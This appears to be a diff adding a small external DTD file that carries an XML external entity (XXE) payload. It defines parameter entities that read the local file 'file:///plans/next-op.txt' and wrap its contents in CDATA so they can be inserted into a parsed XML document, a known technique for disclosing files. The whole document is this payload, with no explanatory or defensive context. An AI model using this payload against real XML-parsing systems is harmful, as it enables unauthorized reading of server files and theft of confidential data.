@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file:///plans/next-op.txt">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % wrapper "<!ENTITY &#x25; all '%start;%file;%end;'>">
+%wrapper;
